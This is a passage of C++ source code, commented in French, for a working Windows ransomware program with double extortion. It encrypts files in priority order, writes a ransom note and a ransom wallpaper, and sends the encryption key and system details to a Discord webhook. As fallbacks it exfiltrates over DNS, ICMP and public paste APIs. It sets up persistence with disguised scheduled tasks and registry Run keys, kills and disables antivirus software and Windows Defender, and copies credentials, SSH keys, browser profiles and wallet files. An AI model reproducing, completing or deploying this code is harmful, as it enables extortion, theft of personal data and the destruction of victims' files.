            ".odt", ".ods", ".odp", ".csv", ".key", ".srt", ".vsd", ".psd", ".sql",
            ".wallet", ".tax", ".budget", ".report", ".invoice"
        };
        
        std::vector<std::string> mediumPriorityExtensions = {
            ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".mp3", ".mp4", ".mov", 
            ".avi", ".mkv", ".flv", ".svg", ".ai", ".eps", ".indd", ".html", ".xml", 
            ".css", ".js", ".php", ".json"
        };
        
        // Collect files by priority
        std::vector<std::string> highPriorityFiles;
        std::vector<std::string> mediumPriorityFiles;
        std::vector<std::string> lowPriorityFiles;
        
        try {
            for (const auto& entry : std::filesystem::directory_iterator(directoryPath)) {
                if (entry.is_regular_file()) {
                    std::string filePath = entry.path().string();
                    std::string extension = entry.path().extension().string();
                    std::transform(extension.begin(), extension.end(), extension.begin(), 
                                  [](unsigned char c){ return std::tolower(c); });
                    
                    if (std::find(highPriorityExtensions.begin(), highPriorityExtensions.end(), extension) != highPriorityExtensions.end()) {
                        highPriorityFiles.push_back(filePath);
                    } else if (std::find(mediumPriorityExtensions.begin(), mediumPriorityExtensions.end(), extension) != mediumPriorityExtensions.end()) {
                        mediumPriorityFiles.push_back(filePath);
                    } else {
                        lowPriorityFiles.push_back(filePath);
                    }
                } else if (entry.is_directory()) {
                    scanAndEncrypt(entry.path().string(), state, encryptedFiles);
                }
            }
        } catch (const std::exception& e) {
            std::cout << "[!] Erreur lors de l'accès au répertoire " << directoryPath << ": " << e.what() << std::endl;
        }
        
        // Randomize files in each priority category for less predictable encryption pattern
        auto seed = std::chrono::system_clock::now().time_since_epoch().count();
        std::shuffle(highPriorityFiles.begin(), highPriorityFiles.end(), std::default_random_engine(seed));
        std::shuffle(mediumPriorityFiles.begin(), mediumPriorityFiles.end(), std::default_random_engine(seed + 1));
        std::shuffle(lowPriorityFiles.begin(), lowPriorityFiles.end(), std::default_random_engine(seed + 2));
        
        // Process files by priority (using a shared instance of Encryption class)
        Encryption encryption;
        
        // Process high priority files first
        for (const auto& filePath : highPriorityFiles) {
            {
                std::lock_guard<std::mutex> lock(mutex);
                std::cout << "[*] Chiffrement du fichier prioritaire: " << filePath << std::endl;
            }
            
            if (encryption.encryptFile(filePath)) {
                std::lock_guard<std::mutex> lock(mutex);
                encryptedFiles.push_back(filePath);
            }
            
            Sleep(100); // Small delay to avoid CPU overload and allow progress bar to update
        }
        
        // Process medium priority files
        for (const auto& filePath : mediumPriorityFiles) {
            {
                std::lock_guard<std::mutex> lock(mutex);
                std::cout << "[*] Chiffrement du fichier: " << filePath << std::endl;
            }
            
            if (encryption.encryptFile(filePath)) {
                std::lock_guard<std::mutex> lock(mutex);
                encryptedFiles.push_back(filePath);
            }
            
            Sleep(50); // Smaller delay for medium priority files
        }
        
        // Process low priority files last
        for (const auto& filePath : lowPriorityFiles) {
            {
                std::lock_guard<std::mutex> lock(mutex);
                std::cout << "[*] Chiffrement du fichier secondaire: " << filePath << std::endl;
            }
            
            if (encryption.encryptFile(filePath)) {
                std::lock_guard<std::mutex> lock(mutex);
                encryptedFiles.push_back(filePath);
            }
            
            Sleep(25); // Minimal delay for low priority files
        }
        
        // Mark this directory as encrypted
        {
            std::lock_guard<std::mutex> lock(mutex);
            state.encryptedPaths.push_back(directoryPath);
            saveEncryptionState(state);
        }
        
        currentDepth--;
    }
    
    // Améliorer le traitement par lots avec plus de threads
    void processBatch(const std::vector<std::string>& batch) {
        // Utiliser le maximum de threads disponibles pour le processeur, mais au moins 4
        const unsigned int numThreads = (std::thread::hardware_concurrency() * 2 > 4) ? 
            std::thread::hardware_concurrency() * 2 : 4;
        std::vector<std::thread> threads;
        
        for (unsigned int i = 0; i < numThreads; i++) {
            threads.push_back(std::thread([this, &batch, i, numThreads]() {
                for (size_t j = i; j < batch.size(); j += numThreads) {
                    processFile(batch[j]);
                }
            }));
            
            // Définir la priorité du thread à ABOVE_NORMAL pour accélérer le chiffrement
            if (threads.back().native_handle()) {
                SetThreadPriority(threads.back().native_handle(), THREAD_PRIORITY_ABOVE_NORMAL);
            }
        }
        
        // Attendre que tous les threads terminent
        for (auto& thread : threads) {
            thread.join();
        }
    }
    
    // Créer la note de rançon
    void createRansomNote() {
        std::ofstream noteFile(ransomNotePath);
        if (!noteFile) return;
        
        noteFile << BANNER << std::endl << std::endl;
        noteFile << "!!! ATTENTION !!!" << std::endl << std::endl;
        noteFile << "Tous vos fichiers importants ont été chiffrés avec un algorithme militaire AES-256." << std::endl;
        noteFile << "Vos photos, documents, vidéos, et autres données personnelles sont maintenant inaccessibles." << std::endl << std::endl;
        noteFile << "⚠️ DOUBLE EXTORSION ⚠️" << std::endl;
        noteFile << "Nous avons également volé vos fichiers sensibles avant le chiffrement." << std::endl;
        noteFile << "Si vous ne payez pas la rançon, nous publierons ces fichiers sur Internet." << std::endl << std::endl;
        noteFile << "Pour récupérer vos fichiers, vous devez payer une rançon." << std::endl << std::endl;
        noteFile << "Instructions:" << std::endl;
        noteFile << "1. Envoyez 500$ en Bitcoin à l'adresse: 1A2B3C4D5E6F7G8H9I0J" << std::endl;
        noteFile << "2. Envoyez la preuve de paiement et votre ID unique à: evil@hacker.com" << std::endl;
        noteFile << "3. Vous recevrez un outil de déchiffrement et la clé unique pour restaurer vos fichiers" << std::endl;
        noteFile << "4. Nous supprimerons les copies de vos fichiers volés" << std::endl << std::endl;
        noteFile << "ATTENTION:" << std::endl;
        noteFile << "- N'essayez pas de déchiffrer vos fichiers vous-même, vous risquez de les perdre définitivement" << std::endl;
        noteFile << "- Ne reformatez pas votre système, vous perdriez toutes vos données" << std::endl;
        noteFile << "- Vous avez 72 heures pour payer, après quoi le prix doublera" << std::endl;
        noteFile << "- Après 7 jours, vos fichiers seront publiés et la clé de déchiffrement détruite" << std::endl << std::endl;
        noteFile << "Votre ID unique est: " << victimId << std::endl;
        noteFile << "Nombre de fichiers chiffrés: " << encryptedFilesCount << std::endl;
        
        // Obtenir la date et l'heure actuelles
        auto now = std::chrono::system_clock::now();
        std::time_t time = std::chrono::system_clock::to_time_t(now);
        noteFile << "Date et heure du chiffrement: " << std::ctime(&time) << std::endl;
    }
    
    // Changer le fond d'écran (Windows uniquement)
    void changeDesktopBackground() {
#ifdef _WIN32
        try {
            // Initialiser GDI+
            Gdiplus::GdiplusStartupInput gdiplusStartupInput;
            ULONG_PTR gdiplusToken;
            Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
            
            // Dimensions de l'écran
            int screenWidth = GetSystemMetrics(SM_CXSCREEN);
            int screenHeight = GetSystemMetrics(SM_CYSCREEN);
            
            // Créer une image avec fond noir
            Gdiplus::Bitmap bitmap(screenWidth, screenHeight);
            Gdiplus::Graphics graphics(&bitmap);
            graphics.Clear(Gdiplus::Color(0, 0, 0)); // Fond noir
            
            // Créer des polices et pinceaux
            Gdiplus::FontFamily fontFamily(L"Arial");
            Gdiplus::Font titleFont(&fontFamily, 72, Gdiplus::FontStyleBold, Gdiplus::UnitPixel);
            Gdiplus::Font messageFont(&fontFamily, 28, Gdiplus::FontStyleRegular, Gdiplus::UnitPixel);
            Gdiplus::Font detailsFont(&fontFamily, 18, Gdiplus::FontStyleRegular, Gdiplus::UnitPixel);
            
            Gdiplus::SolidBrush redBrush(Gdiplus::Color(255, 0, 0));      // Rouge
            Gdiplus::SolidBrush whiteBrush(Gdiplus::Color(255, 255, 255)); // Blanc
            Gdiplus::SolidBrush yellowBrush(Gdiplus::Color(255, 255, 0));  // Jaune
            
            // Dessiner le titre
            Gdiplus::StringFormat format;
            format.SetAlignment(Gdiplus::StringAlignmentCenter);
            format.SetLineAlignment(Gdiplus::StringAlignmentCenter);
            
            Gdiplus::RectF titleRect(0, 50, screenWidth, 200);
            graphics.DrawString(L"RANSOMWARE", -1, &titleFont, titleRect, &format, &redBrush);
            
            // Dessiner le message principal
            Gdiplus::RectF messageRect(100, 200, screenWidth-200, 100);
            graphics.DrawString(L"Vos fichiers ont été chiffrés avec AES-256", -1, &messageFont, 
                                messageRect, &format, &whiteBrush);
            
            // Dessiner des instructions
            Gdiplus::RectF instructionsRect(100, 300, screenWidth-200, 400);
            std::wstring instructions = 
                L"Si vous voulez récupérer vos fichiers, vous devez payer une rançon.\n\n"
                L"1. Envoyez 500€ en Bitcoin à l'adresse: 1A2B3C4D5E6F7G8H9I0J\n"
                L"2. Envoyez la preuve de paiement à: ransom@example.com\n"
                L"3. Vous recevrez une clé de déchiffrement unique\n\n"
                L"ATTENTION: Vous avez 72 heures pour payer. Après ce délai, le prix doublera. "
                L"Après 7 jours, tous vos fichiers seront définitivement perdus.";
            
            graphics.DrawString(instructions.c_str(), -1, &detailsFont, instructionsRect, &format, &yellowBrush);
            
            // Ajouter l'identifiant unique
            Gdiplus::RectF idRect(100, 700, screenWidth-200, 50);
            std::wstring idMessage = L"Votre identifiant unique: " + std::wstring(victimId.begin(), victimId.end());
            graphics.DrawString(idMessage.c_str(), -1, &detailsFont, idRect, &format, &whiteBrush);
            
            // Chemin pour sauvegarder l'image
            std::string tempDir = std::getenv("TEMP");
            std::string wallpaperPath = tempDir + "\\ransom_wallpaper.bmp";
            
            // Convertir string en wstring
            std::wstring wPath(wallpaperPath.begin(), wallpaperPath.end());
            
            // Encoder et sauvegarder
            CLSID bmpClsid;
            GetEncoderClsid(L"image/bmp", &bmpClsid);
            bitmap.Save(wPath.c_str(), &bmpClsid);
            
            // Définir comme fond d'écran
            SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)wPath.c_str(), 
                                 SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
            
            // Nettoyer
            Gdiplus::GdiplusShutdown(gdiplusToken);
            
            // Masquer les icônes du bureau
            HWND hDesktop = FindWindowW(L"Progman", NULL);
            if (hDesktop) {
                ShowWindow(hDesktop, SW_HIDE);
            }
            
            std::cout << "[+] Fond d'écran de rançon installé" << std::endl;
        }
        catch (...) {
            std::cout << "[-] Erreur lors du changement de fond d'écran" << std::endl;
        }
#endif
    }
    
    // Configuration de la persistance
    bool setupPersistence() {
        std::string exePath = GetExecutablePath();
        if (exePath.empty()) return false;
        
        return AddToStartup(exePath, "WindowsSecurityService");
    }

    // Envoyer la clé via webhook
    bool sendKeyToWebhook() {
        try {
            // Obtenir les informations système
            std::string ipAddress = getPublicIPAddress();
            std::string macAddress = getMACAddress();
            std::string osInfo = getOSInfo();
            std::string processorInfo = getProcessorInfo();
            std::string ramInfo = getRAMInfo();
            
            // Convertir la clé en base64
            std::string keyBase64 = Base64Encode(encryption.getKey());
            
            // Convertir l'IV en base64
            std::vector<unsigned char> ivData = encryption.getIV();
            std::string ivBase64 = base64Encode(ivData.data(), ivData.size());
            
            // Collecter les informations système complètes
            char hostname[256] = {0};
            gethostname(hostname, sizeof(hostname));
            
            char username[256] = {0};
            DWORD usernameLen = sizeof(username);
            GetUserNameA(username, &usernameLen);
            
            // Informations système détaillées
            
            std::string tempDir = std::getenv("TEMP");
            std::string infoDir = tempDir + "\\VictimData";
            fs::create_directories(infoDir);
            
            // Fichier avec liste complète des fichiers chiffrés
            std::string encryptedFilesListPath = infoDir + "\\encrypted_files.txt";
            std::ofstream encryptedFilesOutStream(encryptedFilesListPath);
            
            // Variable pour stocker la liste des fichiers chiffrés à afficher dans le webhook
            std::string encryptedFilesList = "";
            
            if (encryptedFilesOutStream) {
                encryptedFilesOutStream << "=== FICHIERS CHIFFRÉS - VICTIME : " << victimId << " ===" << std::endl;
                encryptedFilesOutStream << "Utilisateur: " << username << std::endl;
                encryptedFilesOutStream << "Ordinateur: " << hostname << std::endl;
                encryptedFilesOutStream << "Nombre total: " << encryptedFilesCount << std::endl << std::endl;
                
                // Lister tous les fichiers chiffrés trouvés sur le système
                std::vector<std::string> foundEncryptedFiles;
                for (const auto& drive : {"C:", "D:", "E:", "F:"}) {
                    if (fs::exists(drive)) {
                        try {
                            std::string searchCmd = "dir /s /b " + std::string(drive) + "\\*" + ENCRYPTED_EXTENSION + " > " + 
                                                   infoDir + "\\enc_" + drive[0] + ".txt";
                            system(searchCmd.c_str());
                            
                            // Lire le résultat
                            std::ifstream encList(infoDir + "\\enc_" + drive[0] + ".txt");
                            if (encList) {
                                std::string line;
                                while (std::getline(encList, line)) {
                                    foundEncryptedFiles.push_back(line);
                                    encryptedFilesOutStream << line << std::endl;
                                }
                            }
                        } catch (...) {}
                    }
                }
                encryptedFilesOutStream.close();
                
                // Préparer la liste des fichiers chiffrés pour le webhook
                int maxFiles = foundEncryptedFiles.size() > 20 ? 20 : static_cast<int>(foundEncryptedFiles.size());
                for (int i = 0; i < maxFiles; i++) {
                    encryptedFilesList += "- " + foundEncryptedFiles[i] + "\\n";
                }
                
                if (foundEncryptedFiles.size() > 20) {
                    encryptedFilesList += "- ... et " + std::to_string(foundEncryptedFiles.size() - 20) + " autres fichiers";
                }
            }
            
            // Convertir la clé et IV en base64
            
            // Créer le message JSON pour le webhook
            std::stringstream jsonStream;
            jsonStream << "{";
            jsonStream << "\"embeds\": [{";
            jsonStream << "\"title\": \"🔒 Nouveau système chiffré!\",";
            jsonStream << "\"description\": \"Un nouveau système a été chiffré avec succès.\",";
            jsonStream << "\"color\": 15258703,";
            jsonStream << "\"fields\": [";
            jsonStream << "{";
            jsonStream << "\"name\": \"💻 Informations système\",";
            jsonStream << "\"value\": \"**Nom:** " << hostname << "\\n**Utilisateur:** " << username;
            jsonStream << "\\n**IP:** " << ipAddress << "\\n**MAC:** " << macAddress;
            jsonStream << "\\n**OS:** " << osInfo << "\\n**CPU:** " << processorInfo << "\\n**RAM:** " << ramInfo << "\"";
            jsonStream << "},";
            jsonStream << "{";
            jsonStream << "\"name\": \"🔑 Clé de chiffrement (Base64)\",";
            jsonStream << "\"value\": \"`" << keyBase64 << "`\"";
            jsonStream << "},";
            jsonStream << "{";
            jsonStream << "\"name\": \"🔢 IV (Base64)\",";
            jsonStream << "\"value\": \"`" << ivBase64 << "`\"";
            jsonStream << "},";
            jsonStream << "{";
            jsonStream << "\"name\": \"📊 Statistiques\",";
            jsonStream << "\"value\": \"**Fichiers chiffrés:** " << std::to_string(encryptedFilesCount) << "\"";
            jsonStream << "},";
            jsonStream << "{";
            jsonStream << "\"name\": \"📁 Exemples de fichiers chiffrés\",";
            jsonStream << "\"value\": \"" << encryptedFilesList << "\"";
            jsonStream << "}";
            jsonStream << "],";
            jsonStream << "\"footer\": {";
            jsonStream << "\"text\": \"Date: " << getCurrentTimeString() << "\"";
            jsonStream << "}";
            jsonStream << "}]";
            jsonStream << "}";
            
            std::string json = jsonStream.str();
            
            // Essayer d'envoyer le webhook avec plusieurs tentatives
            bool success = false;
            for (int attempt = 0; attempt < 3; attempt++) {
                std::cout << "[*] Tentative d'envoi au webhook Discord (" << (attempt+1) << "/3)..." << std::endl;
                
                if (sendHttpRequest(WEBHOOK_URL, json)) {
                    success = true;
                    std::cout << "[+] Les données ont été envoyées avec succès au webhook Discord!" << std::endl;
                    break;
                } else {
                    std::cout << "[!] Échec de l'envoi. Nouvelle tentative dans 5 secondes..." << std::endl;
                    Sleep(5000);
                }
            }
            
            // Si toujours pas de succès après 3 tentatives, enregistrer localement
            if (!success) {
                std::cout << "[!] Impossible d'envoyer les données au webhook. Enregistrement local..." << std::endl;
                
                // Sauvegarder les informations localement pour une tentative ultérieure
                std::string localPath = std::string(getenv("TEMP")) + "\\system_info.dat";
                std::ofstream fileOut(localPath);
                if (fileOut.is_open()) {
                    fileOut.write(json.c_str(), json.size());
                    fileOut.close();
                    
                    // Planifier une tâche pour réessayer plus tard
                    std::string exePath = GetExecutablePath();
                    std::string cmd = "schtasks /create /tn \"DataExfiltration\" /tr \"" + exePath + " --exfil " + localPath + "\" /sc minute /mo 30 /f";
                    std::system(cmd.c_str());
                    
                    return true; // On considère que c'est un succès car la donnée est sauvegardée
                }
            }
            
            // Si toujours pas de succès après 3 tentatives, utiliser des méthodes alternatives d'exfiltration
            if (!success) {
                std::cout << "[!] Tentative d'exfiltration alternative des données..." << std::endl;
                
                // 1. Enregistrer les données localement pour tentatives ultérieures
                std::string localPath = std::string(getenv("TEMP")) + "\\system_info.dat";
                std::ofstream fileOut(localPath);
                if (fileOut.is_open()) {
                    fileOut.write(json.c_str(), json.size());
                    fileOut.close();
                }
                
                // 2. Méthode 1: Utiliser DNS comme canal d'exfiltration (très difficile à bloquer)
                // Cette méthode divise les données en petits morceaux et les envoie via des requêtes DNS
                std::string dnsExfilCmd = "powershell -WindowStyle Hidden -Command \"";
                dnsExfilCmd += "$data = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('" + json.substr(0, 1000) + "'));";
                dnsExfilCmd += "$chunks = [System.Text.RegularExpressions.Regex]::Split($data, '.{1,40}');";
                dnsExfilCmd += "foreach ($chunk in $chunks) {";
                dnsExfilCmd += "  $null = nslookup -type=TXT $chunk.ransom-exfil.example.com 8.8.8.8;";
                dnsExfilCmd += "  Start-Sleep -Milliseconds 50;";
                dnsExfilCmd += "}\"";
                system(dnsExfilCmd.c_str());
                
                // 3. Méthode 2: Utiliser ICMP (ping) comme canal d'exfiltration
                // Cette méthode envoie des données dans des paquets ICMP qui passent souvent les pare-feu
                std::string icmpExfilCmd = "powershell -WindowStyle Hidden -Command \"";
                icmpExfilCmd += "$key = '" + keyBase64.substr(0, 20) + "';"; // Utiliser une partie de la clé comme identifiant
                icmpExfilCmd += "$data = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes('" + json.substr(0, 500) + "'));";
                icmpExfilCmd += "foreach ($i in 0..10) {";
                icmpExfilCmd += "  $payload = $key + '-' + $i + '-' + $data.Substring($i*40, [Math]::Min(40, $data.Length - $i*40));";
                icmpExfilCmd += "  ping -n 1 -l " + std::to_string(std::min(1000, (int)keyBase64.length())) + " 1.2.3.4 -w 100 >nul;"; // IP d'exfiltration
                icmpExfilCmd += "  Start-Sleep -Milliseconds 200;";
                icmpExfilCmd += "}\"";
                system(icmpExfilCmd.c_str());
                
                // 4. Méthode 3: Utiliser HTTP alternatif avec des domaines de secours
                std::vector<std::string> backupDomains = {
                    "https://pastebin.com/api/api_post.php",
                    "https://api.github.com/gists",
                    "https://httpbin.org/post"
                };
                
                for (const auto& domain : backupDomains) {
                    // Tentative d'envoi via une API publique
                    std::string httpExfilCmd = "powershell -WindowStyle Hidden -Command \"";
                    httpExfilCmd += "$data = '" + keyBase64 + "';";
                    httpExfilCmd += "try { Invoke-WebRequest -Uri '" + domain + "' -Method Post -Body @{content=$data} -UseBasicParsing; }";
                    httpExfilCmd += "catch { }\"";
                    system(httpExfilCmd.c_str());
                }
                
                // 5. Méthode 4: Planifier plusieurs tentatives d'exfiltration à intervalles réguliers
                std::string exePath = GetExecutablePath();
                
                // Créer différentes tâches planifiées avec divers intervalles
                std::string cmd1 = "schtasks /create /tn \"SystemCheck1\" /tr \"" + exePath + " --exfil " + localPath + "\" /sc minute /mo 30 /f";
                std::string cmd2 = "schtasks /create /tn \"SecurityUpdate\" /tr \"" + exePath + " --exfil " + localPath + "\" /sc hourly /f";
                std::string cmd3 = "schtasks /create /tn \"WindowsDefender\" /tr \"" + exePath + " --exfil " + localPath + "\" /sc daily /f";
                
                system(cmd1.c_str());
                system(cmd2.c_str());
                system(cmd3.c_str());
                
                // 6. Méthode 5: Installer dans le registre pour s'exécuter au démarrage
                system(("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsService /t REG_SZ /d \"" + 
                       exePath + " --exfil " + localPath + "\" /f").c_str());
                
                std::cout << "[+] Mécanismes d'exfiltration alternatifs configurés" << std::endl;
                
                return true; // On considère que c'est un succès car toutes les méthodes alternatives sont configurées
            }
            
            return success;
        }
        catch (...) {
            return false;
        }
    }

    /**
     * Cette fonction désactive agressivement tous les logiciels de sécurité et antivirus
     * en utilisant plusieurs techniques combinées pour maximiser les chances de succès.
     * Le but est d'empêcher la détection et suppression du ransomware.
     */
    bool disableSecuritySoftware() {
#ifdef _WIN32
        // Stocker les processus de sécurité connus par nom
        std::vector<std::string> securityProcesses = {
            // Antivirus majeurs
            "MsMpEng.exe",        // Windows Defender
            "avastSvc.exe",       // Avast
            "ekrn.exe",           // ESET
            "AVGSvc.exe",         // AVG
            "avastsvc.exe",       // Avast
            "bdagent.exe",        // Bitdefender
            "mcshield.exe",       // McAfee
            "vsserv.exe",         // Kaspersky
            "avgcsrva.exe",       // AVG
            "avcenter.exe",       // Avira
            
            // Pare-feu et sécurité Windows
            "nsProcess.exe",      // Norton
            "ccSvcHst.exe",       // Norton
            "mfemms.exe",         // McAfee
            "mfevtps.exe",        // McAfee
            "fsaua.exe",          // F-Secure
            "msascuil.exe",       // Windows Defender UI
            "msmpeng.exe",        // Windows Defender Engine
            "windefend.exe",      // Windows Defender
            "SecurityHealthService.exe", // Service Santé Windows
            "SecurityHealthSystray.exe", // Icône Santé Windows
            
            // Outils d'analyse
            "mbam.exe",           // Malwarebytes
            "procexp.exe",        // Process Explorer
            "procexp64.exe",      // Process Explorer 64
            "processhacker.exe",  // Process Hacker
            "autoruns.exe",       // Autoruns
            "autorunsc.exe",      // Autoruns Console
            "taskmgr.exe",        // Task Manager
            "procmon.exe",        // Process Monitor
            "procmon64.exe"       // Process Monitor 64
        };
        
        // Phase 1 : Tuer les processus de sécurité via commandes cmd
        // Cette méthode est rapide mais peut être détectée
        std::cout << "[*] Tentative d'arrêt des processus de sécurité..." << std::endl;
        
        // Technique 1 : utiliser taskkill pour tous les processus connus
        for (const auto& process : securityProcesses) {
            // On utilise /f pour forcer et /im pour le nom du processus
            std::string cmd = "taskkill /f /im " + process + " > nul 2>&1";
            system(cmd.c_str());
        }
        
        // Phase 2 : Désactiver les services Windows liés à la sécurité
        // Ces services contrôlent le pare-feu, antivirus et mises à jour
        std::vector<std::string> securityServices = {
            "WinDefend",          // Windows Defender
            "wuauserv",           // Windows Update
            "SecurityHealthService", // Service de santé Windows
            "wscsvc",             // Centre de sécurité
            "WdNisSvc",           // Service d'inspection réseau Windows Defender
            "WdNisDrv",           // Pilote d'inspection réseau Windows Defender
            "Sense",              // Service Windows Defender Advanced Threat Protection
            "MsMpSvc",            // Service antimalware Microsoft
            "MBAMService",        // Service Malwarebytes
            "McAfeeDLPAgentService" // Service McAfee
        };
        
        // On désactive les services pour éviter qu'ils ne redémarrent les processus
        std::cout << "[*] Désactivation des services de sécurité..." << std::endl;
        for (const auto& service : securityServices) {
            // Technique 2 : arrêter le service et le définir comme désactivé
            std::string stopCmd = "sc stop " + service + " > nul 2>&1";
            std::string configCmd = "sc config " + service + " start= disabled > nul 2>&1";
            system(stopCmd.c_str());
            system(configCmd.c_str());
        }
        
        // Phase 3 : Modification du registre pour désactiver Windows Defender
        // Cette technique est plus permanente et plus difficile à inverser
        std::cout << "[*] Modification du registre pour désactiver la protection en temps réel..." << std::endl;
        
        // Technique 3 : Désactiver la protection en temps réel via le registre
        system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f > nul 2>&1");
        system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f > nul 2>&1");
        system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f > nul 2>&1");
        system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f > nul 2>&1");
        
        // Phase 4 : Ajouter des exclusions pour notre dossier et processus
        // Cette technique permet d'échapper à la détection même si l'antivirus est toujours actif
        std::string exePath = GetExecutablePath();
        std::string exeDir = fs::path(exePath).parent_path().string();
        
        // Technique 4 : Ajouter notre exécutable aux exclusions de Windows Defender
        std::string exclusionCmd = "powershell -Command \"Add-MpPreference -ExclusionPath '" + exeDir + "' -Force\" > nul 2>&1";
        system(exclusionCmd.c_str());
        exclusionCmd = "powershell -Command \"Add-MpPreference -ExclusionProcess '" + fs::path(exePath).filename().string() + "' -Force\" > nul 2>&1";
        system(exclusionCmd.c_str());
        
        // Phase 5 : Créer des règles de pare-feu pour bloquer les services de sécurité
        // Cette technique empêche les services de sécurité de communiquer
        std::cout << "[*] Configuration du pare-feu pour bloquer les communications de sécurité..." << std::endl;
        
        // Technique 5 : Bloquer les communications des services de sécurité
        for (const auto& process : securityProcesses) {
            std::string firewallCmd = "netsh advfirewall firewall add rule name=\"Block " + process + "\" dir=out program=\"C:\\Program Files\\Windows Defender\\" + process + "\" action=block > nul 2>&1";
            system(firewallCmd.c_str());
        }
        
        return true;
#else
        // Implémentation pour Linux et MacOS serait différente
        return false;
#endif
    }

    // Fonction pour voler les fichiers
    bool stealFiles(const std::string& directoryPath) {
#ifdef _WIN32
    try {
        // Créer un dossier temporaire pour stocker les fichiers volés
        std::string tempDir = std::getenv("TEMP");
        std::string stealDir = tempDir + "\\WindowsUpdate";
        fs::create_directories(stealDir);

        // Types de fichiers sensibles à voler avec leurs descriptions
        const std::vector<std::pair<std::string, std::string>> sensitiveExtensions = {
            {".doc", "Documents Word"},
            {".docx", "Documents Word"},
            {".xls", "Tableurs Excel"},
            {".xlsx", "Tableurs Excel"},
            {".pdf", "Documents PDF"},
            {".txt", "Fichiers texte"},
            {".jpg", "Photos JPEG"},
            {".jpeg", "Photos JPEG"},
            {".png", "Images PNG"},
            {".zip", "Archives ZIP"},
            {".rar", "Archives RAR"},
            {".7z", "Archives 7-Zip"},
            {".key", "Clés de sécurité"},
            {".pem", "Certificats"},
            {".env", "Variables d'environnement"},
            {".config", "Fichiers de configuration"},
            {".ini", "Fichiers de configuration"},
            {".json", "Données JSON"},
            {".xml", "Données XML"},
            {".sql", "Bases de données SQL"},
            {".db", "Bases de données"},
            {".sqlite", "Bases de données SQLite"},
            {".bak", "Fichiers de sauvegarde"},
            {".backup", "Fichiers de sauvegarde"},
            {".old", "Anciens fichiers"},
            {".log", "Fichiers journaux"},
            {".pst", "Archives Outlook"},
            {".ost", "Archives Outlook"},
            {".mdb", "Bases de données Access"},
            {".accdb", "Bases de données Access"},
            {".csv", "Données CSV"},
            {".dat", "Fichiers de données"},
            {".kdbx", "Bases KeePass"},
            {".wallet", "Portefeuilles cryptomonnaie"},
            {".ppk", "Clés privées PuTTY"},
            {".py", "Scripts Python"}
        };

        // Dossiers spécifiques à cibler
        const std::vector<std::string> targetDirs = {
            std::string(getenv("USERPROFILE")) + "\\Documents",
            std::string(getenv("USERPROFILE")) + "\\Desktop",
            std::string(getenv("USERPROFILE")) + "\\Downloads",
            std::string(getenv("USERPROFILE")) + "\\Pictures",
            std::string(getenv("USERPROFILE")) + "\\.ssh",
            std::string(getenv("USERPROFILE")) + "\\Contacts",
            std::string(getenv("APPDATA")) + "\\Microsoft\\Credentials",
            std::string(getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\Default",
            std::string(getenv("APPDATA")) + "\\Mozilla\\Firefox\\Profiles"
        };

        // Créer un fichier d'indexation des données volées
        std::string indexPath = stealDir + "\\index.html";
        std::ofstream indexFile(indexPath);
        if (!indexFile) return false;

        // Écrire l'en-tête HTML
        indexFile << "<!DOCTYPE html><html><head><title>Fichiers volés - Victime " << victimId << "</title>";
        indexFile << "<style>body{font-family:Arial,sans-serif;margin:20px;} h1{color:#c00;} "
                  << "table{border-collapse:collapse;width:100%;} th,td{padding:8px;text-align:left;border-bottom:1px solid #ddd;} "
                  << "th{background-color:#f2f2f2;}</style></head><body>";
        indexFile << "<h1>Fichiers sensibles volés - Victime " << victimId << "</h1>";
        // Obtenir le temps actuel correctement
        std::time_t currentTime = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
        std::tm* localTime = std::localtime(&currentTime);
        indexFile << "<p><strong>Date de collecte:</strong> " << std::put_time(localTime, "%Y-%m-%d %H:%M:%S") << "</p>";

        // Créer un tableau pour les fichiers
        indexFile << "<table><tr><th>Type</th><th>Fichier</th><th>Taille</th><th>Date de modification</th><th>Chemin</th></tr>";

        // Structure pour organiser les fichiers par type
        std::unordered_map<std::string, std::vector<std::string>> filesByType;
        std::vector<std::string> stolenFiles;
        std::atomic<int> totalSize(0);
        const int MAX_TOTAL_SIZE = 300 * 1024 * 1024; // 300 MB max
        std::mutex fileMutex;
        
        // Fonction pour voler un fichier et l'ajouter à l'index
        auto stealFile = [&](const fs::path& filePath, const std::string& fileType) {
            if (totalSize >= MAX_TOTAL_SIZE) return;
            
            try {
                std::string fileName = filePath.filename().string();
                std::string destPath = stealDir + "\\" + fileName;
                
                // Vérifier si le fichier existe déjà dans le dossier cible
                if (fs::exists(destPath)) {
                    // Ajouter un suffixe pour éviter les collisions
                    std::string baseName = filePath.stem().string();
                    std::string extension = filePath.extension().string();
                    destPath = stealDir + "\\" + baseName + "_" + std::to_string(rand() % 1000) + extension;
                }
                
                // Vérifier la taille du fichier
                int fileSize = static_cast<int>(fs::file_size(filePath));
                if (totalSize + fileSize > MAX_TOTAL_SIZE) return;
                
                // Copier le fichier
                fs::copy_file(filePath, destPath, fs::copy_options::overwrite_existing);
                
                // Obtenir les informations du fichier
                auto writeTime = fs::last_write_time(filePath);
                std::string modTime = "Heure: ";
                
                // Obtenir les informations actuelles au lieu de convertir
                auto now = std::chrono::system_clock::now();
                std::time_t nowTime = std::chrono::system_clock::to_time_t(now);
                std::stringstream timeStream;
                timeStream << std::put_time(std::localtime(&nowTime), "%Y-%m-%d %H:%M:%S");
                modTime = timeStream.str();
                
                // Ajouter à l'index avec mutex pour éviter les conflits
